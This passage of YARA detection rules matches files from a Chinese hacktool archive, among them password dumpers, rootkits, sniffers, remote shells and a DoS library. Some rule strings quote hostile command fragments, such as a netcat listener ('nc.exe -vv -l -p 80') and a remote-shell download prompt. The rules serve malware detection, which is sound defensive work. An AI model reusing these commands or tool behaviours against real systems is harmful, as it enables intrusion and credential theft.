		$s0 = "IsProcessDeleting" fullword ascii
		$s1 = "IsdEnumProcesses" fullword ascii
		$s7 = "IceSword110.dll" fullword ascii
		$s8 = "GetAddrTableFromStack" fullword ascii
		$s16 = "RawOpenKey" fullword ascii
		$s17 = "IsdEnumerateKey" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_PWDump4 {
	meta:
		description = "Chinese Hacktool Archive - file PWDump4.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "63f35f8528e3733a57e6e93752ec407d9bf61423"
	strings:
		$s0 = "PWDUMP4.exe" fullword wide
		$s1 = "(ERROR_OPEN_PROCESS)" fullword ascii
		$s2 = "%s.exe \"%s%s\"" fullword ascii
		$s3 = "PWDUMP4 dump winnt/2000 user/password hash remote or local for crack" fullword wide
		$s4 = "\\\\.\\pipe\\%" fullword ascii
		$s9 = "NO PASSWORD" fullword ascii
	condition:
		5 of them
}

rule CN_Hacktools_NetFuke_Analyse {
	meta:
		description = "Chinese Hacktool Archive - file NetFuke_Analyse.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "37f7bae50403137d0126f2bcb9e5909ef764fd63"
	strings:
		$s0 = "powered by shadow" fullword ascii
		$s1 = "NetFuke_Analyse.dll" fullword ascii
		$s2 = "auth login" fullword ascii
		$s6 = "EnableSMTP = FALSE" fullword ascii
		$s8 = "SMTPPort = 25" fullword ascii
		$s9 = "SMTPPort = " fullword ascii
		$s20 = "EnablePOP = FALSE" fullword ascii
	condition:
		6 of them
}

rule CN_Hacktools_HDConfig {
	meta:
		description = "Chinese Hacktool Archive - file HDConfig.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "78691418a929a3db83213cfe0f4ae7361ed96ce8"
	strings:
		$s0 = "system.log" fullword ascii
		$s3 = "Could not create a new key container,errorcode:" fullword ascii
		$s4 = "HDConfig.EXE" fullword wide
		$s8 = "Could not lock password." fullword ascii
		$s11 = "%d/%d/%d %d:%d:%d l=%d" fullword ascii
		$s17 = "A hash object has been created. " fullword ascii
		$s18 = "Error during CryptDecrypt!" fullword ascii
		$s19 = "Could not locate password." fullword ascii
	condition:
		6 of them
}

rule CN_Hacktools_tools_SETUPEX {
	meta:
		description = "Chinese Hacktool Archive - file SETUPEX.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "86d951437f37e12e0f00f1f37773693fe3e38c9e"
	strings:
		$s1 = "WinExec failed: return=%d7Could not create destination file %s.  Error n" wide
		$s9 = "Awsps.exe" fullword ascii
		$s10 = "CORECOMP.INI" fullword ascii
		$s12 = "Please enter the password required to extract the attached files." fullword wide
		$s13 = "LZWSERV.EXE" fullword ascii
		$s14 = "_delis43.ini" fullword ascii
		$s19 = "_ISUSER.DLL" fullword ascii
		$s20 = "setup.ins" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_IceSword {
	meta:
		description = "Chinese Hacktool Archive - file IceSword.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "07fa9d0008f5b9a9690cf23074a6e7a23bd23d06"
	strings:
		$s6 = "IsdGetVersion" fullword ascii
		$s7 = "IceSword.dll" fullword ascii
		$s9 = "IsdGetModuleFileName" fullword ascii
		$s10 = "\\IceSword-Cooperator" fullword wide
		$s20 = "IsdQueryInformationFile" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_WinAircrackPack_wzcook {
	meta:
		description = "Chinese Hacktool Archive - file wzcook.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "71717bc7e87ed268d39b3b6f967d713714e0cd34"
	strings:
		$s0 = "Keys have been stored in C:\\wepkeys.txt. Press Ctrl-C." fullword ascii
		$s1 = "Could not read c:\\wepkeys.txt, the WZCOOK service probably failed unexpectedly" fullword ascii
		$s7 = "c:\\wepkeys.txt" fullword ascii
		$s13 = "WEP/WPA-PMK key recovery service" fullword ascii
		$s14 = "Could not open WZCOOK service" fullword ascii
		$s15 = "maybe you're not an administrator ?" fullword ascii
		$s17 = "ESSID                             WEP KEY / WPA PMK" fullword ascii
		$s18 = "Static#%04d" fullword ascii
		$s19 = "WZCOOK" fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_bin_Client {
	meta:
		description = "Chinese Hacktool Archive - file Client.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9965591cbc18036ada240a296842fe10f801da39"
	strings:
		$s0 = "Client.EXE" fullword wide
		$s1 = "=====Remote Shell Closed=====" fullword ascii
		$s2 = "PROCESS NAME" fullword ascii
		$s12 = "Compter name" fullword ascii
		$s13 = "All Files(*.*)|*.*||" fullword ascii
		$s19 = "Kill Success" fullword ascii
		$s20 = "fxftest" fullword ascii
	condition:
		6 of them
}

rule CN_Hacktools_vanquish {
	meta:
		description = "Chinese Hacktool Archive - file vanquish.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "41b77010f7a7e6fef063b5c98e688325b132d205"
	strings:
		$s0 = "Vanquish - DLL injection failed:" fullword ascii
		$s2 = "Failed to inject VANQUISH!" fullword ascii
		$s7 = ">>>LogonUserW interception; Login %s" fullword ascii
		$s8 = "c:\\vanquish.log" fullword wide
		$s10 = "Not able to EnumServicesW properly (need additional %u bytes)." fullword ascii
		$s12 = "VanquishAutoInjectingDLL" fullword wide
		$s15 = "###OldPassword:%S" fullword ascii
		$s16 = "###Password:%s" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_He4HookInv {
	meta:
		description = "Chinese Hacktool Archive - file He4HookInv.sys"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b930cfe938f51dd7196e38f43d154d96ba3b6952"
	strings:
		$s0 = "He4HookInv: _InvisibleDriverUnload: Driver unload is %s!!!" fullword ascii
		$s2 = "AddHookedDriverIntoTree: Hooked drivers - %u (%08x) !!!" fullword ascii
		$s3 = "dwFileAccessType - Not implemented yet !!!!" fullword ascii
		$s4 = "ree\\He4HookInv.sys" fullword ascii
		$s5 = "inasys\\He4HookInv.dbg" fullword ascii
		$s6 = "He4HookInv.sys" fullword ascii
		$s7 = "Start IntermediateIrpCompletion %08x !!!!" fullword ascii
		$s8 = "Not implemented yet !!!!" fullword ascii
		$s9 = "__InvisibleDriverEntry@8" fullword ascii
		$s10 = "ByOne = TRUE!!!!" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_A5_CD_CB___B0_CDi_A2_DFi_AF {
	meta:
		description = "Chinese Hacktool Archive - file %A5%CD%CB=-%B0%CDi%A2%DFi%AF.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "3c12a5104300daab8b303e28437b1e294993384f"
	strings:
		$s0 = "\\Release\\KillHost.pdb" ascii
		$s1 = "KillHost.exe" fullword wide
		$s2 = "name=\"Microsoft.Windows.KillHost\"" fullword ascii
		$s3 = "watercloud < safesuite@263.net >" fullword wide
		$s4 = "SelectDialog" fullword ascii
		$s6 = "Y\\ceed\\<~" fullword ascii
		$s15 = " KillHost(&A)..." fullword wide
	condition:
		3 of them
}

rule CN_Hacktools_tools_winux {
	meta:
		description = "Chinese Hacktool Archive - file winux.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "86f166ba3f194b2ef097914b4a47a86b9d951a67"
	strings:
		$s0 = "Silver Key" fullword wide
		$s1 = "$Id: UPX 1.00 Copyright (C) 1996-2000 the UPX Team. All Rights Reserved." fullword ascii
	condition:
		PEFILE and $s0 and $s1
}

rule CN_Hacktools_CISCOPWD {
	meta:
		description = "Chinese Hacktool Archive - file CISCOPWD.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "924151735f51adac0cce53851445b1313c7a3e17"
	strings:
		$s0 = "Usage: %s -p <encrypted password>" fullword ascii
		$s2 = "password: %s" fullword ascii
		$s6 = "%s <router config file> <output file>" fullword ascii
		$s10 = "enable-password 7 " fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_SKTerminal {
	meta:
		description = "Chinese Hacktool Archive - file SKTerminal.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "55fda40d1a4dd83a1616999e8104e08482e56f4c"
	strings:
		$s0 = "\\regsvr32.exe /s msrdp.ocx" fullword ascii
		$s1 = " (C) 2007 http://www.dream2fly.net" fullword wide
		$s2 = "SKTerminal.EXE" fullword wide
		$s3 = "MsRDP.MsRDP.3" fullword ascii
		$s5 = "{7584C670-2274-4EFB-B00B-D6AABA6D3850}" fullword wide
		$s10 = "SKTerminal" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_DarkSpy105Help {
	meta:
		description = "Chinese Hacktool Archive - file DarkSpy105Help.chm"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9aaa1afdeb1585ec0c9a24f84515e77e64c5ef20"
	strings:
		$s1 = "/process.jpg" fullword ascii
		$s2 = "Table of Contents.hhc" fullword ascii
		$s5 = "/port.JPG" fullword ascii
		$s17 = "/reg_ana.JPG" fullword ascii
		$s18 = "/driver.JPG" fullword ascii
		$s20 = "/file.JPG" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_commOver {
	meta:
		description = "Chinese Hacktool Archive - file commOver.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f2027bbd32b6608ba91f47a5b0c1f705ca685526"
	strings:
		$s1 = "cmd.exe /c telnet " fullword wide
		$s3 = "explorer http://www.xianker.com" fullword wide
		$s4 = "sqlhello2.exe" fullword ascii
		$s6 = "commOver.exe" fullword wide
		$s7 = "explorer http://haicao.126.com" fullword wide
		$s8 = "regsvr32.exe /s Comdlg32.ocx" fullword wide
		$s10 = "http://haicao.126.com" fullword ascii
		$s13 = "11\\CommOver.vbp" fullword wide
		$s15 = "*.txt|*.txt|*.*|*.*" fullword wide
		$s17 = "vb6chs.dll" fullword ascii
		$s20 = "CommOver" fullword wide
	condition:
		4 of them
}

rule CN_Hacktools_winsniff {
	meta:
		description = "Chinese Hacktool Archive - file winsniff.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "01bdb4a878b07b8bb2e1198430e9d1a0e4342c49"
	strings:
		$s0 = "http://winsniff.hypermart.net " fullword ascii
		$s1 = "ntsniff.exe" fullword wide
		$s2 = "Usage: smmsniff /a AdapterNumber [ options ]" fullword ascii
		$s3 = "sniffer@mycabin.com" fullword ascii
		$s4 = "Passwords file : %s" fullword ascii
		$s7 = "-[%d]-%s %s--%s->" fullword ascii
		$s9 = "smmsniff" fullword wide
		$s10 = "W32N50.dll" fullword ascii
		$s11 = "WinSniffer" fullword ascii
		$s15 = "X-Mailer: NTSniffer" fullword
	condition:
		4 of them
}

rule CN_Hacktools_tools_hideapp {
	meta:
		description = "Chinese Hacktool Archive - file hideapp.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d2e37e1ea9fc2ddb6c04983c25328c24a00303ec"
	strings:
		$s1 = "Runtime error 000 at 0000:0000." fullword ascii
		$s4 = "Usage:  HideApp  Application  [Application parameters]" fullword ascii
		$s7 = "HideApp" fullword ascii
		$s8 = "Can't execute program" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_example {
	meta:
		description = "Chinese Hacktool Archive - file example.cmd"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "faf92aaecdac91760020cefd26b1413e600330e2"
	strings:
		$s0 = "echo Opening UDP port 500 and IP proto 50 and 51 for IPSEC" fullword ascii
		$s4 = "echo Filtering all protocols" fullword ascii
		$s5 = "ipf enable all > nul:" fullword ascii
		$s12 = "ipf add tcp 80 > nul:" fullword ascii
		$s13 = "echo Configuring packet filtering for all network interfaces ..." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_MS03_046Scanner {
	meta:
		description = "Chinese Hacktool Archive - file MS03-046Scanner.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e2ec7e02e41f0f17760f387be99736c6e01629fa"
	strings:
		$s10 = "[+]Usage:%s 192.168.0.1 192.168.0.254 " fullword ascii
		$s20 = "[+]MS03-046 Microsoft Exchange 2000 Heap Overflow" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_getdirrw {
	meta:
		description = "Chinese Hacktool Archive - file getdirrw.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d7334a53b0ba9863d0fa61d18b8cd2d03d3ad924"
	strings:
		$s0 = "getdirrw.txt" fullword ascii
		$s1 = "PECompact2" fullword ascii
		$s3 = "Application error" fullword ascii
		$s20 = "FeLibraryH" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_Binary_builder {
	meta:
		description = "Chinese Hacktool Archive - file builder.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d8f6413dedae6facbdd5d296c9d7c6dc1978d172"
	strings:
		$s1 = "Fwb Webdl By TheLord" fullword wide
		$s2 = "By TheLord" fullword wide
		$s3 = "Please Visit Http://undergroundkonnekt.net" fullword wide

		$x1 = "Loader.exe" fullword wide
		$x2 = "Both server and dll will be installed in System32 Directory" fullword ascii
		$x3 = "builder.exe" fullword wide
		$x4 = "\\loader.exe" fullword wide
		$x5 = "VBA5.DLL" fullword ascii
		$x6 = "server created" fullword wide
		$x7 = "proggam" fullword ascii
	condition:
		( 1 of ($s*) ) and ( 3 of ($x*) )
}

rule CN_Hacktools_bin_wuaus {
	meta:
		description = "Chinese Hacktool Archive - file wuaus.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "5d08e7aaf2b4e15cd95105eb8ceebaac8f336ecb"
	strings:
		$s0 = "wuaus.dll" fullword ascii
		$s1 = "TCP Send Error!!" fullword ascii
		$s2 = "wuauserv" fullword ascii
		$s3 = "setsock" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_debuggy {
	meta:
		description = "Chinese Hacktool Archive - file debuggy.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b875945563b7cfcd6b728c8d814fd0589a2aa2d8"
	strings:
		$s0 = "TestProcessor" fullword ascii
		$s1 = "debuggy.dll" fullword ascii
		$s2 = "CreateDebuggerMainThread" fullword ascii
		$s6 = "GOFORDEBUG" fullword ascii
		$s12 = "TRAFFIC" fullword ascii
		$s13 = "UninitDBGEvents" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_xftp {
	meta:
		description = "Chinese Hacktool Archive - file xftp.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e0ee1da6f61e069fab9392a2583dc16fd4e07cee"
	strings:
		$s0 = "Example: xftp xxxx.com 21 put d:\\src.txt /target.txt root pass" fullword ascii
		$s1 = "Login FTP server failed, username: %s, password: %s" fullword ascii
		$s2 = "xftp xxxx.com 21 get /src.txt d:\\target.txt" fullword ascii
		$s4 = "%s - simple command line ftp client, code by glacier" fullword ascii
		$s13 = "get: download file from FTP server and save to <Target File>" fullword ascii
		$s19 = "http://www.xfocus.org" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_DosAttack {
	meta:
		description = "Chinese Hacktool Archive - file DosAttack.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ed42ea18cf4b5a37ef9862226e6cfb8ca70d11bd"
	strings:
		$s0 = "DosAttack.dll" fullword ascii
		$s5 = "DosAttack Dynamic Link Library" fullword wide
		$s7 = "DosAttack DLL" fullword wide
		$s11 = "TKRestartAttack" fullword ascii
		$s14 = "TKDOSAttack" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_bin_sdt {
	meta:
		description = "Chinese Hacktool Archive - file sdt.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d33ddd5afa0bde8a728cfe780affbb6af9d8ed29"
	strings:
		$s1 = "------ Serivce Table dump ------" fullword ascii
		$s3 = "NO SERVICE TABLE FOUND. VERY STRANGE!" fullword ascii
		$s6 = "SrvTable at %#x used by %d threads" fullword ascii
		$s7 = "SDT finder %s, Joanna Rutkowska, 2003" fullword ascii
		$s8 = "can't communicate with kernel module (IOCTL_KLISTER_DUMP_ST)" fullword ascii
		$s9 = "Windows 2000 Server [2195], SP2" fullword ascii
		$s18 = "\\\\.\\klister" fullword wide
		$s19 = "determinig OS version... " fullword ascii
	condition:
		6 of them
}

rule CN_Hacktools_x_firewalk {
	meta:
		description = "Chinese Hacktool Archive - file x-firewalk.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "7d1cdc271c3213c974fb58ad2b221048b5dd91d8"
	strings:
		$s1 = "%s <ip|hostname through GetWay> [option]" fullword ascii
		$s3 = "Scan %s %s Protocol, Port from %d to %d, TTL=%d:" fullword ascii
		$s4 = "E-mail  : crackersoftware@163.com  Code By Xtiger  2005.5" fullword ascii
		$s8 = "TCP %d Port is Open By ACL!" fullword ascii
		$s9 = "-o:port1-port2 ACL Scan between port1 2 port2. Default 0-65535 " fullword ascii
		$s11 = "Tracing route to %s [%s] by TCP" fullword ascii
		$s12 = "HomePage: http://www.xdoors.net  All For Free Live Dream..." fullword ascii
		$s13 = "over a maximum of %d hops, timeout in %d milliseconds:" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_winshell {
	meta:
		description = "Chinese Hacktool Archive - file winshell.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "0aafdf078c8aed03e60969d7af1dd0f55bdc7276"
	strings:
		$s0 = "http://www.janker.org/winshell.exe" fullword ascii
		$s1 = "winshell.exe" fullword ascii
		$s2 = "WinShell v5.0 (C)2002 janker.org" fullword ascii
		$s3 = "Provide Windows CmdShell Service" fullword ascii
		$s4 = "CMD>http://.../srv.exe" fullword ascii
		$s5 = "winshell" fullword ascii
		$s6 = "WinShell Service" fullword ascii

		$x1 = "s Shell" fullword ascii
		$x2 = "r Remove" fullword ascii
		$x3 = "p Path" fullword ascii
		$x4 = "i Install" fullword ascii
		$x5 = "? for help" fullword ascii
		$x6 = "x eXit" fullword ascii
		$x7 = "d shutDown" fullword ascii
		$x8 = "b reBoot" fullword ascii
		$x9 = "q Quit" fullword ascii
	condition:
		( 2 of ($s*) ) or ( 6 of ($x*) )
}

rule CN_Hacktools_dll_intl {
	meta:
		description = "Chinese Hacktool Archive - file intl.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ea7acbb5d98ef57d571f9766e75605d523e238da"
	strings:
		$s0 = "i:\\target\\share\\locale" fullword ascii
		$s1 = "intl.dll" fullword ascii
		$s2 = "This library is free software; you can redistribute it and/or modify it " wide
		$s3 = "iconv.dll" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_IceSword_2 {
	meta:
		description = "Chinese Hacktool Archive - file IceSword.chm"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "71ea8254aa14453881f41da450a4de1351421fc5"
	strings:
		$s2 = "/index.htm" fullword ascii
		$s6 = "Index.hhk" fullword ascii
		$s19 = "icesword" fullword ascii
	condition:
		PEFILE and all of ($s*)
}

rule CN_Hacktools_Spider_Engine {
	meta:
		description = "Chinese Hacktool Archive - file Spider.Engine.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c3a9777dc3910ae402172da7ac2f415c2d29440d"
	strings:
		$s1 = "Spider.Engine.dll" fullword wide
		$s3 = "(Spider)ProcessedCount: {0}" fullword wide
		$s9 = "Spider.Engine" fullword wide
		$s14 = "(Spider)LogNote: {0}" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_BluesPortScan {
	meta:
		description = "Chinese Hacktool Archive - file BluesPortScan.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "0443e360d1334c7f9910a510df5712689c710869"
	strings:
		$s0 = "BluesPortScan.exe" fullword wide
		$s1 = "BlueBit's UltraFast Port Scanner - GUI" fullword wide
		$s4 = "Please send any bugs reports, suggesstions or questions to PortScan@Blue" wide
		$s6 = "This program was made by Volker Voss" fullword ascii
		$s7 = "Blue's Port Scanner" fullword wide
		$s8 = "ICQ UIN281980 or www.bluebitter.de" fullword wide
		$s11 = "\"Port Tools\" Project" fullword wide
		$s16 = "TPORTFORM" fullword wide
	condition:
		4 of them
}

rule CN_Hacktools_wanpacket {
	meta:
		description = "Chinese Hacktool Archive - file wanpacket.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "829ea8e6caae1ae750599b44fa09b5ce6c23cd18"
	strings:
		$s3 = "WanPacketCloseAdapter: Severe error, IRTC::Stop failed" fullword ascii
		$s4 = "NetGroup - Politecnico di Torino" fullword wide
		$s6 = "WanPacket.dll" fullword wide
		$s20 = "WanPacketSetBufferSize" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_FileMgr {
	meta:
		description = "Chinese Hacktool Archive - file FileMgr.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8ab6361f8ab390ef3943d974baa05ea71569e43c"
	strings:
		$s0 = "FileMgr.EXE" fullword wide
		$s15 = "FileMgr Microsoft " fullword wide
		$s16 = "SYSRESTYPE" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_RadASM {
	meta:
		description = "Chinese Hacktool Archive - file RadASM.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "139ce6f726fb61cbce4d8fb65741732717ce2ab9"
	strings:
		$s5 = "RadASM.exe" fullword wide
		$s12 = "Normal,Upper,Lower,Number,Password" fullword ascii
		$s13 = "Error during pipe creation" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_bin_xHook {
	meta:
		description = "Chinese Hacktool Archive - file xHook.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "fde92fab50bfa8ca585df6a08db4a8cb0ecd7d22"
	strings:
		$s1 = "c:\\%d.%s.detail.log" fullword ascii
		$s2 = "gethostbyname <%s>" fullword ascii
		$s5 = "%s %s:%d %s " fullword ascii
		$s6 = "LogData:malloc() for hex" fullword ascii
		$s12 = "%.2d-%.2d-%.2d %.2d:%.2d:%.2d [+] %s" fullword ascii
		$s13 = "xHook.dll" fullword ascii
		$s15 = "TCP %s:%d %s " fullword ascii
		$s16 = "LogData:fopen()" fullword ascii
	condition:
		5 of them
}

rule CN_Hacktools_arpspoof {
	meta:
		description = "Chinese Hacktool Archive - file arpspoof.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "dfd11e9746a668c67003760cb570f8ebe7019196"
	strings:
		$s0 = "Rpspoof" fullword ascii
		$s1 = "runtime error" fullword ascii
		$s3 = "200 OK\\r\\n" ascii
		$s4 = "/Rich/" fullword ascii
		$s5 = "RESET" ascii
	condition:
		all of them
}

rule CN_Hacktools_SessionIE {
	meta:
		description = "Chinese Hacktool Archive - file SessionIE.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "14c8eaf3b815ae8fd3dcfe49aea170684bfbc8b4"
	strings:
		$s0 = "Header with version: %s and encoding: %s." fullword ascii
		$s1 = "Failed to fault in temp-path %s with 0x%X." fullword wide
		$s11 = "Error opening section to stub exe: %s, error: 0x%X." fullword wide
		$s17 = "Failed to map view of stub-exe for: %s, location: %s with 0x%X" fullword wide
		$s20 = "Failed to fault in directory.  Error: 0x%X, Path: %s" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_keygen {
	meta:
		description = "Chinese Hacktool Archive - file keygen.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e340a51813e3ad8e6070ed00167cd96c9e6e4263"
	strings:
		$s0 = "keygen.DLL" fullword ascii
		$s2 = "the smaller" fullword ascii
		$s3 = "GenerateKeyfile" fullword ascii
		$s4 = "VerifyKeyfile" fullword ascii
		$s5 = "ConvertToBin" fullword ascii
		$s6 = "CreateFileAEn" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_commOver12 {
	meta:
		description = "Chinese Hacktool Archive - file commOver12.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "5678fead2f1ac03c6f38059792f46278d53b9bdb"
	strings:
		$s1 = "cmd.exe /c telnet " fullword wide
		$s2 = "sqlhello2.exe" fullword ascii
		$s3 = "commOver12.exe" fullword wide
		$s6 = "explorer http://haicao.126.com" fullword wide
		$s8 = "nc.exe -vv -l -p 80" fullword ascii
		$s9 = "nc.exe -vv -l -p " fullword wide
		$s12 = "http://www.eviloctal.com/forum" fullword ascii
		$s14 = "NC.EXE" fullword wide
		$s16 = "http://haicao.126.com" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_He4HookControl {
	meta:
		description = "Chinese Hacktool Archive - file He4HookControl.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "fe7accfb27d4011fcebf36f9ed2bb183f4a1bb60"
	strings:
		$s2 = "He4HookControl.exe -a:c:\\MyFile -c:RV" fullword ascii
		$s7 = "He4Dev@hotmail.com" fullword ascii
		$s9 = "Kernel mode driver supported only WinNT !" fullword ascii
		$s10 = "n = 1 - hook Zw*/Nt* func." fullword ascii
		$s13 = "Hook file system - ERROR!!!" fullword ascii
		$s14 = "-a:full_file_name - Add file to save list" fullword ascii
		$s15 = "Create class He4HookDriverHide - ERROR!!!" fullword ascii
		$s19 = "n != 0 - load new image driver force." fullword ascii
		$s20 = "Client Id = %0x (%s) (%s)" fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_tools_engine {
	meta:
		description = "Chinese Hacktool Archive - file engine.sys"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "de21abf9ddb464f1562f6faeb573564a63d8d2cc"
	strings:
		$s2 = "engine.sys for stripper" fullword wide
		$s3 = "\\REGISTRY\\Machine\\HARDWARE\\DEVICEMAP" fullword wide
		$s4 = "engine.sys" fullword wide
		$s5 = "stripper" fullword wide
		$s6 = "DriverWorks (c) Copyright 2003 Compuware Corporation" fullword ascii
		$s7 = "EngineDevice" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_AckCmdS {
	meta:
		description = "Chinese Hacktool Archive - file AckCmdS.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "866e30c9d64f67b6ff0df2fde3a1c12dd20da483"
	strings:
		$s0 = "Timeout while executing command." fullword ascii
		$s1 = "cmd /c " fullword ascii
		$s3 = "More..." fullword ascii
	condition:
		PEFILE and ( all of ($s*) )
}

rule CN_Hacktools_gdiscan_gui {
	meta:
		description = "Chinese Hacktool Archive - file gdiscan_gui.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b3c56188da5d6ed19bd77817f55af5ea93d945da"
	strings:
		$s0 = "LaBrea Technologies, Inc." fullword wide
		$s1 = "Under OfficeXP" fullword ascii
		$s7 = "Win2K SP2" fullword ascii
		$s9 = "IDI_ICON1" fullword wide
		$s13 = "GDIScan" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_AddIns_RADbg {
	meta:
		description = "Chinese Hacktool Archive - file RADbg.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "039b2c8877da8fe144638c2accd6ff5d8cc73160"
	strings:
		$s1 = "efl eax ebx ecx edx esi edi ebp esp eip var err " fullword ascii
		$s2 = "RADbg.dll" fullword wide
		$s3 = "RadASM debug addin" fullword wide
		$s5 = "KetilO (C) 2002" fullword wide
		$s6 = "RadASM debug" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_JiurlPortHide_Loader {
	meta:
		description = "Chinese Hacktool Archive - file JiurlPortHide Loader.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "4432ce69e68c9611aa92152378de0e27ae1a7068"
	strings:
		$s0 = "JiurlPortHideLoader.EXE" fullword wide
		$s3 = "%s\\JiurlPortHide.sys" fullword ascii
		$s7 = "Guide:   Place \"JiurlPortHide.sys\" under Current Directory." fullword ascii
		$s8 = "jiurl@mail.china.com" fullword wide
		$s13 = "ServiceFile: %s" fullword ascii
		$s14 = "http://jiurl.yeah.net" fullword wide
		$s15 = "DeleteService SUCCESS" fullword ascii
		$s18 = "_________________________[ PortHide Started ]___________________________________" fullword ascii
		$s19 = "JiurlPortHide Loader" fullword wide
		$s20 = "Press any key to Stop PortHide .." fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_tools_REMOTE {
	meta:
		description = "Chinese Hacktool Archive - file REMOTE.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a926c18e3d066a7f9094c8931e93e4b0b2a00f58"
	strings:
